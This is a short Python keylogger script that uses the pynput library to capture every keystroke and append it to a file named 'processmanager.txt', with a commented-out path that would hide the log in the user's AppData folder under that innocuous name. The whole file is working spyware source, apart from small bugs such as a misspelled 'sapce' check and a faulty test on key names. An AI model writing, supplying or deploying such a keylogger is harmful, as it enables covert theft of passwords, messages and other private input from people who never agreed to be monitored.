import os
from pynput.keyboard import Listener

keys = []
count = 0
#path = os.environ['appdata'] + '\\processmanager.txt'
path = 'processmanager.txt'

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(path, 'a') as file:
        for key in keys: 
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                file.write(' Backspace ')
            elif k.find('enter') > 0:
                file.write('\n')
            elif k.find('shift') > 0:
                file.write(' Shift ')
            elif k.find ('sapce') > 0:
                file.write(' ')
            elif k.find('caps_lock') > 0:
                file.write(' caps_lock ')
            elif k.find('Key'):
                file.write(k)
            





with Listener(on_press=on_press) as listener:
    listener.join()